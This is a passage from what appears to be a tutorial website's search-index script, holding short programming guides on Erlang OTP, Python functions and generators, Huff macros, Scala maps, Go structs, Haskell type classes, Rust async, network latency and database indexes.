a finite state machine pattern. It is suitable for scenarios where a process transitions between a finite number of states based on events.\nCode Example: gen_fsm\n-module(my_fsm). -behaviour(gen_fsm). -export([start_link/0, init/1, state1/2, state2/2]). start_link() -\u003e gen_fsm:start_link({local, ?MODULE}, ?MODULE, [], []). init([]) -\u003e {ok, state1, #{}}. state1(event, State) -\u003e %% Transition logic {next_state, state2, State}. state2(event, State) -\u003e %% Transition logic {next_state, state1, State}. Event Handlers (gen_event) linkThe gen_event behavior is used to implement event handling functionality, where one or more event managers manage a set of event handlers. It allows decoupling the event source from the event handler, making it easy to add, remove, or replace handlers dynamically.\nCode Example: gen_event\n-module(my_event). -behaviour(gen_event). -export([start_link/0, init/1, handle_event/2, handle_call/2, handle_info/2, terminate/2, code_change/3]). start_link() -\u003e gen_event:start_link({local, ?MODULE}, ?MODULE, []). init([]) -\u003e {ok, #{}}. handle_event(Event, State) -\u003e %% Event handling logic {ok, State}. handle_call(Request, State) -\u003e {reply, ok, State}. handle_info(Info, State) -\u003e {noreply, State}. terminate(_Reason, _State) -\u003e ok. code_change(_OldVsn, State, _Extra) -\u003e {ok, State}. Applications linkAn OTP application is a component that can be started and stopped as a unit. It consists of a collection of modules and a set of processes. OTP applications are the building blocks for larger systems, facilitating code reuse and modularity.\nCode Example: Application\n-module(my_app). -behaviour(application). -export([start/2, stop/1]). start(_StartType, _StartArgs) -\u003e my_supervisor:start_link(). stop(_State) -\u003e ok. Conclusion linkErlang’s OTP framework provides a powerful set of tools and design principles for building robust, fault-tolerant applications. By leveraging supervision trees, generic servers, finite state machines, event handlers, and applications, developers can create scalable and maintainable systems that meet the demands of high-availability environments. Understanding and mastering OTP is crucial for any Erlang developer aiming to build production-quality systems.\n"
            }
        );
    index.add(
            {
                id:  245 ,
                href: "\/tutorials\/docs\/python\/python\/python_functions\/",
                title: "Understanding Functions in Python: Definitions, Parameters, Returns, and Scope",
                description: "Master the fundamentals of Python functions, from creation and parameter handling to understanding variable scope. This guide offers detailed explanations and code examples to enrich your programming knowledge.",
                content: "Introduction linkFunctions are a cornerstone of organized, maintainable, and reusable code in Python. They allow you to execute specific blocks of code multiple times without needing to rewrite the code, enhancing the modularity and efficiency of your programs.\nDefining Functions linkA function in Python is defined using the def keyword, followed by a function name, parentheses, and a colon. The code block within every function starts with an indentation.\nSyntax and Explanation: link def function_name(parameters): # Function body return output Example: link def greet(name): \"\"\"Returns a greeting.\"\"\" return f\"Hello, {name}!\" In this example, greet is a simple function that takes one parameter, name, and returns a greeting string. The \"\"\"Returns a greeting.\"\"\" is a docstring, providing a brief description of what the function does.\nParameters and Return Values linkFunctions can accept parameters and return one or more values. Parameters allow you to pass arguments to a function to influence its behavior. Return values let the function pass data back to the caller.\nExample: link def add_numbers(x, y): \"\"\"Returns the sum of two numbers.\"\"\" return x + y result = add_numbers(5, 3) print(\"The sum is:\", result) This function, add_numbers, takes two parameters, x and y, adds them together, and returns their sum. The result variable holds the value returned by the function.\nScope of Variables linkThe scope of a variable determines the part of a program where you can access a particular identifier. There are two basic scopes in Python—local and global.\nLocal Scope linkVariables created inside a function are local to that function and cannot be accessed outside of it.\nGlobal Scope linkVariables defined outside any function are global and can be accessed from any part of the code, including inside functions.\nExample: link global_var = \"I am global\" def test_scope(): local_var = \"I am local\" print(global_var) # Accessible inside the function print(local_var) # Local to this function test_scope() print(global_var) # Prints the global variable # print(local_var) # Would raise an error, as local_var is not accessible here In this example, global_var is a global variable accessible both inside and outside of the test_scope function. local_var, however, is defined within the function and only accessible within it.\nAdvanced Use: Function Parameters and Scopes linkPython functions can have various types of parameters, such as positional, keyword, default, and arbitrary argument lists.\nExample: link def make_pizza(size, *toppings): \"\"\"Summarize the pizza we are about to make.\"\"\" print(f\"Making a {size}-inch pizza with the following toppings:\") for topping in toppings: print(f\"- {topping}\") make_pizza(12, 'pepperoni', 'mushrooms', 'green peppers') This make_pizza function demonstrates the use of arbitrary arguments (*toppings) which allow it to accept any number of toppings specified at the time of call, making the function extremely flexible.\nConclusion linkUnderstanding how to define functions, handle parameters, manage return values, and navigate variable scope is crucial for proficient Python programming. This detailed guide provides the foundational knowledge and practical examples needed to utilize Python functions effectively in your projects.\n"
            }
        );
    index.add(
            {
                id:  246 ,
                href: "\/tutorials\/docs\/huff\/huff\/understanding_huff_macros\/",
                title: "Understanding Huff Macros",
                description: "Huff is a domain-specific, low-level programming language designed explicitly for writing smart contracts on the Ethereum blockchain.",
                content: "Explanation of Macros in Huff linkMacros in Huff are one of its most distinctive and powerful features. They allow you to define reusable code blocks that can be invoked within your contract. This feature helps in organizing complex logic, reducing redundancy, and making contracts more readable. Unlike functions in high-level languages, macros do not have their own execution context; they are essentially inlined wherever they are called.\nHow to Create and Use Macros Effectively linkCreating a macro in Huff involves a few key steps:\nDefine the Macro: Start with #define macro MACRO_NAME(). Specify Stack Changes: Indicate how the macro affects the EVM stack using takes (n) returns (m), where n and m are the number of stack elements taken and returned by the macro. Write the Macro Body: Include the EVM opcodes and other macro calls that make up the macro’s logic. Effective use of macros often involves breaking down contract logic into smaller, reusable parts. This approach can significantly optimize gas usage and enhance contract readability.\nCode Example: Implementing a Macro linkLet’s create a macro that doubles a value on the stack:\n#define macro DOUBLE() = takes (1) returns (1) { dup1 // Duplicate the top stack item add // Add the top two stack items } This macro takes one value from the stack, duplicates it, and then adds the two top stack items, effectively doubling the original value.\nIncorporating Macros into Contracts linkMacros are incorporated into Huff contracts by calling them within other macros. For example, you can use the DOUBLE macro in a contract’s main logic:\n#define macro MAIN() = takes (0) returns (0) { 5 // Push the value 5 onto the stack DOUBLE() // Call the DOUBLE macro // Continue with additional contract logic... } In this example, the MAIN macro uses DOUBLE to double the number 5.\n"
            }
        );
    index.add(
            {
                id:  247 ,
                href: "\/tutorials\/docs\/python\/python\/python_iterators_and_generators\/",
                title: "Understanding Iterators and Generators in Python: Leveraging Yield for Efficient Code",
                description: "Dive deep into the mechanics of iterators and generators in Python. Learn how to create custom iterators, design generator functions, and effectively use the yield keyword to optimize memory usage and code execution.",
                content: "Introduction linkIterators and generators are fundamental constructs in Python that allow for efficient looping and data processing, particularly when dealing with large datasets or complex computation scenarios. They help in managing memory efficiently and can make your code faster and more scalable.\nCreating Iterators linkIn Python, iterators are objects that implement the __iter__() and __next__() methods, which collectively allow you to iterate over sequential data.\nDefining an Iterator link class Count: \"\"\"Iterator that counts upward forever.\"\"\" def __init__(self, start=0): self.current = start def __iter__(self): return self def __next__(self): num = self.current self.current += 1 return num # Example of using the Count iterator counter = Count(start=5) print(next(counter)) # 5 print(next(counter)) # 6 print(next(counter)) # 7 This Count class is an iterator that starts counting from a number and goes on indefinitely. The __iter__() method returns the iterator object itself, and the __next__() method returns the next value in the sequence.\nGenerator Functions linkGenerator functions are a simpler way to create iterators using the yield statement. They are written like regular functions but use yield to return data one piece at a time, suspending and resuming their state between each call.\nCreating a Generator Function link def fibonacci(limit): \"\"\"Generate a Fibonacci sequence up to the limit.\"\"\" a, b = 0, 1 while a \u003c limit: yield a a, b = b, a + b # Using the Fibonacci generator for number in fibonacci(10): print(number) # 0, 1, 1, 2, 3, 5, 8 This generator yields the Fibonacci sequence up to a specified limit. The state of the function is maintained between yields, making it memory-efficient and capable of handling complex sequences.\nThe Yield Keyword linkThe yield keyword is used in generator functions and is what differentiates them from regular functions. It allows the function to return an intermediate result to the caller and pause its execution, waiting to be resumed later.\nUnderstanding Yield link def countdown(num): \"\"\"Generator for counting down to zero.\"\"\" while num \u003e 0: yield num num -= 1 # Example of using the countdown generator for count in countdown(5): print(count) # 5, 4, 3, 2, 1 In this countdown generator, yield is used to return the current count on each iteration. The function execution pauses at each yield and resumes from that point the next time the generator is called.\nConclusion linkIterators and generators are powerful tools in Python that provide a way to iterate over data efficiently without loading the entire data set into memory. Understanding how to implement these can greatly enhance the performance and scalability of your applications. This guide has explored creating custom iterators, designing generator functions, and the mechanics of the yield keyword, providing you with the tools needed to handle large data effectively.\n"
            }
        );
    index.add(
            {
                id:  248 ,
                href: "\/tutorials\/docs\/scala\/scala\/understand_maps_in_scala\/",
                title: "Understanding Maps in Scala",
                description: "Learn more about maps in scala",
                content: "Understanding Maps in Scala: A Comprehensive Overview linkMaps are fundamental data structures in programming, facilitating key-value pair associations crucial for various applications. In Scala, maps provide powerful functionalities and are extensively used for efficient data management and lookup operations. This blog post explores the intricacies of maps in Scala, covering their usage, operations, and practical examples.\nWhat is a Map in Scala? linkA map in Scala is an iterable collection of key-value pairs, where each key is unique within the map. This structure allows fast lookup and retrieval of values based on their associated keys. Scala provides both mutable and immutable implementations of maps, catering to different use cases depending on whether mutability is required.\nCreating Maps linkIn Scala, you can create maps using several methods:\nUsing Map Object:\n// Immutable map creation val numbersMap: Map[String, Int] = Map(\"one\" -\u003e 1, \"two\" -\u003e 2, \"three\" -\u003e 3) // Mutable map creation val mutableMap: collection.mutable.Map[String, Int] = collection.mutable.Map(\"a\" -\u003e 1, \"b\" -\u003e 2) Using -\u003e Syntax:\nval colors = Map(\"red\" -\u003e \"#FF0000\", \"green\" -\u003e \"#00FF00\", \"blue\" -\u003e \"#0000FF\") Basic Operations on Maps linkMaps in Scala support a variety of operations categorized into lookup, addition/update, removal, subcollection producers, transformations, and more:\nLookup Operations:\nval value = numbersMap.get(\"two\") // Returns Some(2) or None if key not found val valueOrDefault = numbersMap.getOrElse(\"four\", 0) // Returns 0 if key \"four\" not found val containsKey = numbersMap.contains(\"one\") // Checks if key \"one\" exists Addition and Update Operations:\nval updatedMap = numbersMap + (\"four\" -\u003e 4) // Adds a new key-value pair to the map mutableMap(\"c\") = 3 // Updates value for key \"c\" in mutable map Removal Operations:\nval removedMap = numbersMap - \"three\" // Removes key \"three\" from the map mutableMap -= \"b\" // Removes key \"b\" from mutable map Subcollection Producers:\nval keysIterable = numbersMap.keys // Returns an iterable of all keys val valuesIterable = numbersMap.values // Returns an iterable of all values Transformation Operations:\nval transformedMap = numbersMap.view.mapValues(_ * 10) // Transforms values in the map Practical Example: Caching Function Results linkOne practical use of maps in Scala is caching function results to improve performance, as shown in the following example:\nimport scala.collection.mutable // Expensive function def expensiveComputation(input: String): String = { println(s\"Performing expensive computation for $input\") input.reverse } // Cache map to store computed results val cache = mutable.Map[String, String]() // Function with caching def cachedComputation(input: String): String = { cache.getOrElseUpdate(input, expensiveComputation(input)) } // Usage example println(cachedComputation(\"abc\")) // Prints: Performing expensive computation for abc; cba println(cachedComputation(\"abc\")) // Prints: cba (from cache) In this example, getOrElseUpdate efficiently retrieves the cached value if available or computes and stores it if not, demonstrating how maps can optimize repeated function calls with identical arguments.\nConclusion linkMaps in Scala are versatile data structures that facilitate efficient data organization and retrieval through key-value associations. Whether you’re managing configurations, caching results, or performing lookups, understanding and effectively using maps can significantly enhance your Scala programming experience. By leveraging their rich set of operations and immutability features, you can write more expressive, concise, and performant code in Scala applications.\nIn summary, mastering maps in Scala empowers you to handle complex data relationships with ease, making your code more robust and efficient across various programming scenarios.\n"
            }
        );
    index.add(
            {
                id:  249 ,
                href: "\/tutorials\/docs\/python\/python\/variables_and_data_types\/",
                title: "Understanding Python Variables and Data Types: From Basics to Type Conversion",
                description: "Delve into the fundamentals of Python variables and data types, covering numbers, strings, and booleans, along with essential type conversion techniques to manipulate and utilize data effectively.",
                content: "Introduction linkIn Python, a variable is a container for storing data values. Unlike other programming languages that require explicit declaration to reserve memory space, Python variables do not need explicit declaration to reserve memory. Memory allocation happens automatically when you assign a value to a variable.\nNumbers, Strings, and Booleans linkNumbers linkPython supports various numeric types including integers, floating-point numbers, and complex numbers:\nIntegers (int) are whole numbers, positive or negative, without decimals, of unlimited magnitude. Floating-point numbers (float) represent real numbers and are written with a decimal point dividing the integer and fractional parts. Complex numbers (complex) are written with a “j” as the imaginary part, e.g., 1 + 2j. Example:\nx = 3 # int y = 3.5 # float z = 1+2j # complex Strings linkStrings in Python are arrays of bytes representing Unicode characters. Python has no character data type; a single character is simply a string with a length of one. Strings are created by enclosing characters in either single quotes or double quotes.\nExample:\na = \"Hello\" b = 'World' String operations and slicing are important features:\nprint(a + \" \" + b) # Concatenation print(a * 2) # Repetition print(a[1]) # Indexing print(a[1:4]) # Slicing Booleans linkBooleans represent one of two values: True or False. Boolean expressions include operations like:\nprint(10 \u003e 9) # Returns True print(10 == 9) # Returns False print(10 \u003c 9) # Returns False Type Conversion linkType conversion refers to converting one data type into another. Python provides several built-in functions that allow for explicit conversion of one data type to another, which can be very useful in data manipulation.\nImplicit Conversion: Python automatically converts one data type to another without any user involvement. Explicit Conversion: This requires the use of predefined functions like int(), float(), str(), etc. Example:\nnum_int = 123 # int num_flo = 1.23 # float num_new = num_int + num_flo print(\"datatype of num_new:\", type(num_new)) # Automatically converts int to float num_str = \"456\" # string # Converting string to int print(\"datatype of num_str before:\", type(num_str)) num_str = int(num_str) print(\"datatype of num_str after:\", type(num_str)) Conclusion linkUnderstanding variables and data types is crucial for mastering Python as they form the basis of data manipulation and functionality within any program. This guide has covered the essential aspects, from declaring variables and exploring basic data types to performing type conversions, providing you with a solid foundation for more advanced programming concepts.\n"
            }
        );
    index.add(
            {
                id:  250 ,
                href: "\/tutorials\/docs\/golang\/golang\/structs-and-interfaces-in-go\/",
                title: "Understanding Structs and Interfaces in Go",
                description: "Explore the powerful concepts of structs and interfaces in Go programming. Learn how to define structs, implement methods on them, and utilize interfaces for flexible, scalable code.",
                content: "Introduction:\nWelcome to another insightful dive into Go programming! Today, we’re focusing on two crucial components of Go that provide the foundation for building well-structured and scalable applications: structs and interfaces. Structs allow you to create data types that group related data, making your programs more organized and manageable. Interfaces, on the other hand, define sets of methods that specify behavior, fostering flexible and modular coding practices. Let’s delve into the advanced usage of these features and explore how they can be applied to elevate your Go projects.\n1. Defining and Using Structs\na. Defining Structs:\nA struct in Go is a composite data type that groups together variables under one name. These variables, known as fields, can be of different types. Structs are useful for creating objects in Go since they allow for the combination of data items of different kinds. Here’s how you define a struct:\ntype Product struct { ID int Name string Price float64 } In this example, Product is a struct that has three fields representing a product’s ID, name, and price.\nb. Instantiating Structs:\nYou can create an instance of a struct in several ways:\n// Using the field names explicitly p1 := Product{ID: 101, Name: \"Apple\", Price: 0.99} // Without field names (order matters) p2 := Product{102, \"Banana\", 1.29} c. Accessing Struct Fields:\nAccessing the fields of a struct is straightforward:\nfmt.Println(p1.Name) // Outputs: Apple p2.Price = 1.49 // Updating the price of p2 2. Methods on Structs\nIn Go, methods are like functions but are defined with a receiver argument that is the type of the struct on which they operate. This enables you to define behaviors associated with the struct.\na. Defining Methods:\nfunc (p Product) Describe() string { return fmt.Sprintf(\"Product %d: %s, $%.2f\", p.ID, p.Name, p.Price) } Here, Describe is a method that generates a string summary of a Product. Note that the method is associated with Product using (p Product) before the method name.\nb. Calling Methods:\ndescription := p1.Describe() fmt.Println(description) // Outputs: Product 101: Apple, $0.99 3. Understanding and Implementing Interfaces\na. Defining Interfaces:\nInterfaces in Go specify a set of method signatures (behavior) that a type must implement. They are defined similar to structs but with methods instead of fields.\ntype Describer interface { Describe() string } b. Implementing Interfaces:\nA type implements an interface by implementing its methods. There is no explicit declaration of intent. If Product has a Describe method, it automatically implements the Describer interface.\nvar d Describer = p1 fmt.Println(d.Describe()) // Outputs: Product 101: Apple, $0.99 c. Interfaces as Contracts:\nInterfaces are powerful as they allow you to write functions that can accept any type that implements the interface, leading to flexible and reusable code.\nExample:\nfunc printDescription(d Describer) { fmt.Println(d.Describe()) } printDescription(p1) // Outputs: Product 101: Apple, $0.99 printDescription(p2) // Outputs: Product 102: Banana, $1.49 Conclusion:\nStructs and interfaces are pivotal in Go for building structured and maintainable code. While structs allow you to mold your data in structured forms, interfaces enable you to abstract the behavior from the implementation. This dual functionality provides a robust framework for building complex software that is both scalable and flexible.\nBy mastering structs and interfaces, you elevate your Go programming capabilities, enabling you to tackle more complex projects with confidence and precision.\nNow, if you are interested in upskilling in 2024 with AI development, check out this 6 AI advanced projects with Go where you learng about building with AI and getting the best knowledge there is currently. Here’s the link\nFrequently Asked Questions:\nQ: Can a struct implement multiple interfaces? A: Yes, a struct can implement multiple interfaces, making it a versatile choice for many programming scenarios.\nQ: What happens if a struct does not implement all the methods of an interface? A: If a struct does not implement all the methods declared in the interface, it cannot be used where that interface is required. This will result in a compile-time error, ensuring type safety.\n"
            }
        );
    index.add(
            {
                id:  251 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/throughput_vs_latency\/",
                title: "Understanding the Difference Between Throughput and Latency in Network Performance",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "Latency and throughput are two crucial metrics that measure the performance of a computer network. Both are essential for determining how well a network can handle data transfer and user requests, but they focus on different aspects of network performance.\nWhat is Latency? linkLatency refers to the delay in network communication. It measures the time it takes for data to travel from the source to the destination across the network. Networks with longer delays or lag have high latency, while those with faster response times have lower latency. Latency is often a critical factor for applications requiring real-time interaction, such as online gaming or video conferencing.\nWhat is Throughput? linkThroughput, on the other hand, indicates the average volume of data that can pass through the network over a specific period. It measures the number of data packets that successfully reach their destinations, accounting for any packet loss. High throughput means the network can handle a large amount of data transfer efficiently, which is crucial for data-intensive applications like streaming services and large file transfers.\nWhy are Throughput and Latency Important? linkNetwork performance is determined by how quickly and efficiently data packets can be transferred to their destinations. Latency affects the delay users experience when sending or receiving data, while throughput impacts the number of users who can access the network simultaneously.\nA network with low throughput and high latency will struggle to send and process high data volumes, leading to congestion and poor application performance. Conversely, a network with high throughput and low latency will be more responsive and efficient, enhancing user experience and satisfaction.\nHigh-performing networks are crucial for revenue generation and operational efficiency. Applications such as real-time streaming, Internet of Things (IoT) data analytics, and high-performance computing require specific performance thresholds for optimal operation.\nKey Differences: Latency vs. Throughput linkMeasurement link Latency: Measured by transmitting a small data packet and receiving confirmation of its arrival. This is typically done using the ping command, which provides the round-trip time (RTT) in milliseconds. Throughput: Measured using network testing tools or manually by dividing the file size by the time it takes to transfer. Network testing tools often provide a comprehensive view of throughput, including bandwidth and latency. Units of Measurement link Latency: Measured in milliseconds (ms). Lower values indicate faster network performance. Throughput: Originally measured in bits per second (bps), but now often in kilobytes (KBps), megabytes (MBps), or gigabytes per second (GBps) due to advancements in data transmission technologies. Impacting Factors linkLatency link Geographical Location: Greater distances between the data source and destination increase latency. Network Congestion: High data traffic causes packets to take longer routes. Protocol Efficiency: Additional protocols for security can introduce delays. Network Infrastructure: Overloaded devices lead to dropped packets and retransmissions, increasing latency. Throughput link Bandwidth: Maximum capacity of the transmission medium. Throughput cannot exceed this limit. Processing Power: Specialized hardware or software optimizations improve traffic handling and packet processing, enhancing throughput. Packet Loss: Network congestion, faulty hardware, or misconfigured devices cause packet loss, necessitating retransmissions and reducing throughput. Network Topology: The arrangement of network devices and paths affects data transmission efficiency. Well-designed topologies reduce bottlenecks and increase throughput. Relationship Between Bandwidth, Latency, and Throughput linkLatency and throughput together determine network connectivity and performance. High latency can reduce throughput, as data takes longer to transmit. Conversely, low throughput can appear as high latency due to delayed data arrival.\nBandwidth represents the theoretical maximum data volume transferable over a network, measured in megabytes per second (MBps). While bandwidth is the maximum potential throughput, real-world limitations often reduce actual throughput. Thus, higher bandwidth typically leads to higher throughput, but it does not guarantee optimal network performance alone.\nHow to Improve Latency and Throughput linkCaching linkStoring frequently accessed data closer to the user in proxy servers or content delivery networks (CDNs) reduces latency and increases throughput by decreasing load on the original data source.\nTransport Protocols linkChoosing the appropriate transport protocol for specific applications can enhance performance. For instance, TCP, which ensures data integrity and reduces packet loss, is suitable for data transfers. In contrast, UDP, which minimizes latency, is ideal for real-time applications like video streaming.\nQuality of Service (QoS) linkImplementing QoS strategies can optimize network performance by prioritizing latency-sensitive applications and reducing packet loss for specific data types.\nSummary of Differences: Throughput vs. Latency link Aspect Throughput Latency What it measures Volume of data passing through a network over time. Time delay in sending data across the network. How to measure Manually by file transfer or using network testing tools. Using ping times to calculate round-trip time. Unit of measurement Megabytes per second (MBps). Milliseconds (ms). Impacting factors Bandwidth, processing power, packet loss, network topology. Geographical distance, network congestion, protocol efficiency, network infrastructure. Understanding and optimizing both latency and throughput are vital for achieving high network performance, ensuring that data transfer is both fast and efficient, and meeting the demands of modern applications and users.\n"
            }
        );
    index.add(
            {
                id:  252 ,
                href: "\/tutorials\/docs\/haskell\/haskell\/type-classes-and-polymorphism-in-haskell\/",
                title: "Understanding Type Classes and Polymorphism in Haskell",
                description: "Explore the concepts of type classes and polymorphism in Haskell, including an introduction to foundational type classes like Eq, Ord, and Show, and how to implement custom type classes for sophisticated type handling.",
                content: "Introduction:\nDive deep into Haskell’s advanced features with this comprehensive exploration of type classes and polymorphism. Type classes in Haskell allow for a level of abstraction and code reuse not readily available in many other programming languages, offering powerful ways to work with different data types while maintaining strict type safety. This blog post will guide you through the foundational type classes like Eq, Ord, and Show, show you how to create custom type classes, and discuss the nuanced application of polymorphism in Haskell.\nUnderstanding Foundational Type Classes: Eq, Ord, Show linkType Classes Explained:\nType classes are a fundamental concept in Haskell, representing a sort of interface that defines certain behavior. Different types can be instances of the same type class if they support this behavior. Type classes enable a form of polymorphism where a function can operate on any type that implements a particular set of operations.\nEq Type Class: This class is used for types that support equality testing. Implementing Eq allows you to use operators like == and /= to compare instances of these types. instance Eq Bool where True == True = True False == False = True _ == _ = False Ord Type Class: If a type implements the Ord class, its instances can be ordered. This enables the use of operators such as \u003c, \u003e, \u003c=, and \u003e=. instance Ord Bool where False \u003c True = True _ \u003c _ = False b \u003c= c = (b \u003c c) || (b == c) Show Type Class: This class is meant for types that can be represented as strings, which is useful for logging or converting data to a human-readable format. instance Show Bool where show True = \"True\" show False = \"False\" Implementing Custom Type Classes linkExtending Functionality with Custom Type Classes:\nCustom type classes are extremely useful for defining operations that can be generalized over different types. This section explores how to define your own type classes and implement instances of these classes.\nCreating a Simple Type Class:\nclass Printable a where printIt :: a -\u003e String instance Printable Bool where printIt True = \"Yes\" printIt False = \"No\" Using Custom Type Classes in Functions:\nprintDetails :: Printable a =\u003e a -\u003e String printDetails x = \"Printing value: \" ++ printIt x Polymorphism in Haskell: Constrained and Unconstrained linkDiverse Approaches to Polymorphism:\nPolymorphism in Haskell can be categorized into constrained and unconstrained, each serving different use cases and offering various levels of flexibility and safety.\nConstrained Polymorphism (Using Type Classes): This type of polymorphism uses type classes to specify constraints on the types that a function can work with, ensuring that these types implement certain behavior. -- A function that can operate on any type that is an instance of Eq and Show isEqualAndShow :: (Eq a, Show a) =\u003e a -\u003e a -\u003e String isEqualAndShow x y = show x ++ \" and \" ++ show y ++ \" are equal: \" ++ show (x == y) Unconstrained Polymorphism (Type Variables): This approach allows functions to operate on any type without constraints. It’s more flexible but requires careful handling to avoid type errors. -- A function that accepts any type and returns the same type identity :: a -\u003e a identity x = x Conclusion:\nType classes and polymorphism are cornerstones of Haskell’s type system, enabling not only robust and flexible code but also promoting a deeper understanding of functional programming principles. By mastering these concepts, you can significantly enhance the expressiveness and reusability of your Haskell programs. Experiment with both foundational and custom type classes, and leverage polymorphism to handle a diverse set of programming scenarios effectively.\nFrequently Asked Questions:\nQ: How can I debug issues related to type classes in Haskell? A: Debugging type class issues often involves checking instance declarations and ensuring that type constraints are satisfied. Tools like GHCi can be used to inspect types and trace computations.\nQ: Can type classes be nested in Haskell? A: Yes, type classes can be nested and they can depend on other type classes, allowing you to create complex hierarchies of behavior and functionality.\n"
            }
        );
    index.add(
            {
                id:  253 ,
                href: "\/tutorials\/docs\/rust\/rust\/async_programming_rust\/",
                title: "Unlocking Asynchronous Programming in Rust",
                description: "Explore the powerful asynchronous programming model in Rust with this in-depth guide on the async/await syntax and best practices for building scalable asynchronous applications. Packed with technical insights, practical coding examples, and advanced techniques, this post is essential for Rust developers looking to enhance the responsiveness and performance of their applications.",
                content: "Introduction linkAsynchronous programming is a paradigm that allows programs to perform non-blocking operations, thereby improving throughput and responsiveness. Rust’s support for asynchronous programming is robust, using the async/await syntax alongside powerful features of its type system to ensure safe and efficient execution. This post explores these features, providing a comprehensive guide to mastering asynchronous programming in Rust.\nAsync/Await Syntax linkRust’s async/await syntax provides a convenient way to write asynchronous code that is both easy to read and maintain.\nBasic Async/Await Example:\nuse std::future::Future; use std::time::Duration; use tokio::time::sleep; async fn perform_task() { println!(\"Task started\"); sleep(Duration::from_secs(2)).await; println!(\"Task completed after 2 seconds\"); } #[tokio::main] async fn main() { println!(\"Application started\"); perform_task().await; println!(\"Application ended\"); } This example uses tokio, a popular asynchronous runtime for Rust. The async keyword defines an asynchronous function, which returns a Future. The await keyword is then used to pause the function execution until the future resolves, without blocking the entire thread.\nBuilding Asynchronous Applications linkCreating effective asynchronous applications in Rust involves understanding how async tasks are executed, how to handle multiple concurrent operations, and how to manage state safely across asynchronous boundaries.\nHandling Multiple Concurrent Tasks:\nRust allows you to spawn multiple tasks and manage their execution concurrently. #[tokio::main] async fn main() { let task1 = tokio::spawn(async { perform_task(\"Task 1\", 2).await; }); let task2 = tokio::spawn(async { perform_task(\"Task 2\", 3).await; }); let _ = tokio::join!(task1, task2); } This example demonstrates spawning multiple asynchronous tasks using tokio::spawn, allowing them to execute in parallel. tokio::join! is then used to wait for all tasks to complete.\nError Handling in Async/Await:\nHandling errors in asynchronous Rust code is crucial for building robust applications. Rust’s error handling model using Result extends naturally to async code. async fn fetch_data(url: \u0026str) -\u003e Result { let resp = reqwest::get(url).await?; resp.text().await } This function asynchronously fetches data from a URL and handles errors using the ? operator, which works seamlessly in async functions.\nBest Practices for Asynchronous Programming link Use Efficient Executors: Choosing the right executor for your application is crucial. Executors like Tokio or async-std provide task scheduling, I/O operations, and timers. Avoid Blocking Calls: In asynchronous applications, blocking calls can negate the benefits of non-blocking I/O by halting the execution of the entire thread. Use asynchronous equivalents of blocking APIs wherever possible. Manage State Carefully: Sharing state between tasks should be done carefully using thread-safe types and synchronization primitives, such as Arc and Mutex, designed for async environments. Conclusion linkAsynchronous programming in Rust offers a powerful way to improve the performance and scalability of applications. By understanding and effectively using async/await syntax and adhering to best practices, developers can build applications that are both fast and safe.\n"
            }
        );
    index.add(
            {
                id:  254 ,
                href: "\/tutorials\/docs\/system-design\/system-design\/database_indexes\/",
                title: "Using Database Indexes for Improved Performance",
                description: "If you are looking to grow in you tech career and understand system design indepth, this guide is for you.",
                content: "In database management, optimizing performance is often a critical concern. One powerful tool at your disposal is the use of indexes. Indexes are database structures that significantly enhance the speed and efficiency of data retrieval operations by providing quick access paths to data. Let’s delve deeper into how indexes work, their types, best practices for usage, and considerations for optimal performance.\nUnderstanding Indexes linkAn index in a database is akin to the index of a book, allowing the database engine to quickly locate specific data without scanning the entire table. It is defined on one or more fields of a table and maintains a sorted order of values along with pointers to the actual rows in the table. This organization facilitates rapid retrieval of data based on the indexed columns.\nTypes of Indexes link Single-Column Indexes: These indexes are created on a single column of a table, such as an index on EMP_ID. They are effective for queries that filter or sort based on that specific column.\nComposite Indexes (Multi-Column Indexes): Composite indexes are created on multiple columns. For instance, an index on (LAST_NAME, FIRST_NAME) is useful when queries involve conditions that reference both columns, such as filtering by last name and first name simultaneously.\nBenefits of Using Indexes link Improved Query Performance: Queries that utilize indexed columns can perform significantly faster as the database engine can quickly narrow down the relevant rows.\nEnhanced Sorting and Grouping: Indexes also benefit operations that involve sorting or grouping data, minimizing the need for expensive sorting operations.\nOptimized Joins: When joining multiple tables, indexes on join columns accelerate data retrieval by reducing the number of rows that need to be compared.\nConsiderations and Best Practices link1. Choosing Index Fields: link Index fields should align with frequently queried columns and the types of queries performed. Avoid indexing columns with low selectivity (columns with few distinct values) as they offer less benefit. 2. Impact on Data Modification Operations: link While indexes improve read performance, they can slightly slow down data modification operations (inserts, updates, deletes) as the database engine must update both the table and the index. Therefore, strike a balance by not over-indexing tables unnecessarily. 3. Indexing Expressions: link Some databases support indexes on expressions (e.g., UPPER(LAST_NAME)). These are useful when queries consistently use such expressions for filtering or sorting. 4. Avoiding Over-Indexing: link Excessive indexes consume additional storage space and may degrade performance for data modification operations. Regularly review and remove unused or redundant indexes. 5. Monitoring and Maintenance: link Monitor index usage and performance regularly. Rebuild or reorganize indexes periodically to ensure optimal performance, especially after significant data modifications. Practical Examples linkExample 1: Basic Single-Column Index link CREATE INDEX idx_emp_id ON emp (EMP_ID); Example 2: Composite Index link CREATE INDEX idx_name ON emp (LAST_NAME, FIRST_NAME); Conclusion linkIn conclusion, leveraging indexes effectively can lead to substantial performance gains in database operations, particularly in environments with large datasets and complex queries. By understanding how indexes work, carefully choosing index fields, and managing index usage, database administrators can ensure efficient and responsive database systems. Remember, while indexes are powerful tools, their design and implementation should align closely with the specific usage patterns and performance goals of your database applications. For more detailed guidelines, refer to your database vendor’s documentation and consider consulting with a database expert to optimize your indexing strategy further.\n"
            }
        );
    index.add(
            {
                id:  255 ,
                href: "\/tutorials\/docs\/golang\/golang\/using-databases-in-go\/",
                title: "Using Databases in Go",
                description: "Learn how to connect to SQL and NoSQL databases from Go applications, perform CRUD operations, and utilize popular ORM tools to streamline your data handling.",
